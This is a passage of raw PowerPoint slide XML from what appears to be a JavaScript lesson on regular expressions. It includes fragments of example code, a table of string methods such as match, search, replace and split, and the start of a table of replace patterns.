                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. Next </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>starts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>${</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>regex1</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lastIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</a:t>
            </a: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input</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"12345"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE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\d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>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test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>input</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001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</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"input </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>has</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only</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digits</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18755728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B35468E-5ACC-4D63-99F0-E903EEAE1902}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Regular Expression String Methods</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Taulukko 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1C57233E-43E0-408A-8DB4-D58A0AABC1DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2133434952"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="2865120"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="3254152">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="247786468"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="7718648">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4179590553"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Method</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4130479634"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>str.match</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>regexp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Returns an array containing all the matches, including capturing groups, or null if no match was found</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4031214721"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>str.matchAll</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>regexp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Return iterator containing all the matches, including capturing groups</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="999799286"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>str.search</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>regexp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Return index of the match or -1 if search fails</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2744927160"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>str.replace</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>regexp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>replaceTerm</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Return new string where </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>regexp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t> matches have been replaced with </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>replaceTerm</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="970170605"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>str.replaceAll</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>regexp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>repTerm</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Return new string where all the </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>regexp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t> matches been replaces with </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>repTerm</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="365706794"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>str.split</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>delim</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Return an array of string, after splitting string into substring based on deli</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="819189742"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Sisällön paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D0C3D54E-FD02-4F9A-8B88-913931662E07}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="618347" y="4581128"/>
            <a:ext cx="10972800" cy="1747522"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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sentence</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Programming is</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>n</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>easy</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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</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log</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sentence</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search</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/is/</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12</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FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</a:t>
            </a:r>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words</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sentence</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split</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/\s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</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log</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words</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join</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"_"</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r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Programming_is_easy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11102032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86E9525-BEAF-4842-9E48-3CAFBB508CC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>String Replace Patterns</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Taulukko 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7BE3E550-BD54-4A6D-B791-B1B4987F4D6E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3411947674"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="2595880"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1309936">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2906888015"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="9662864">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="490155532"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Pattern</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Inserts</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1221566139"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>$$</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Inserts $</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2404072440"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
